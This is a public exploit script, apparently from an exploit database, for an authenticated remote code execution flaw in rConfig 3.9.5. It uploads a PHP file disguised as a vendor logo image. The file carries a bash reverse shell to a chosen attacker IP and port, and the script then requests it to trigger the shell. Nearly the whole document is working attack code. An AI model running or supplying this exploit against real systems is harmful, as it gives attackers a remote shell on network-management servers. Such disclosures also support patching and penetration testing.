# Exploit Title: rConfig 3.9.5 - 'vendors.crud.php' Remote Code Execution
# Date: 06/01/2020
# Exploit Author: Matthew Aberegg, Michael Burkey
# Vendor Homepage: https://www.rconfig.com
# Software Link: https://www.rconfig.com/downloads/rconfig-3.9.5.zip
# Version: rConfig 3.9.5
# Tested on: CentOS 7 (1908)


# Exploit Details: 
# This exploit targets an unrestricted file upload vulnerability in the "Vendor Management" functionality of rConfig 3.9.5.

#!/usr/bin/python3
import requests
import sys
from requests_toolbelt import MultipartEncoder
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

if len(sys.argv) != 6:
    print("[~] Usage : python3 exploit.py https://rconfig_host Username Password Attacker_IP, Attacker_Port")
    exit()

host = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
attacker_ip = sys.argv[4]
attacker_port = sys.argv[5]

payload = "<?php shell_exec('bash -i >& /dev/tcp/{0}/{1} 0>&1'); ?>".format(attacker_ip, attacker_port)
login_url = host + "/lib/crud/userprocess.php"
upload_url = host + "/lib/crud/vendors.crud.php"
payload_url = host + "/images/vendor/exploit.php"

def exploit():
    # Get user session
    s = requests.Session()
    res = s.post(
        login_url,
        data = {
            'user': username,
            'pass': password,
            'sublogin': 1
        },
        verify = False,
        allow_redirects = True
    )
    
    # Set up data for file upload to Vendor Management page
    md = MultipartEncoder(
        fields = {
	    'vendorName': 'Netgear',
	    'vendorLogo': ('exploit.php', payload, 'image/jpeg'),
	    'add': 'add',
	    'editid': ''
	    }
    )
    # Upload payload
    res = s.post(upload_url, data=md, headers={'Content-Type': md.content_type})

    # Call reverse shell payload		
    res = s.get(payload_url, verify=False)
    if res.status_code != 200:
        print("[~] Failed to connect")


if __name__ == '__main__':
    exploit()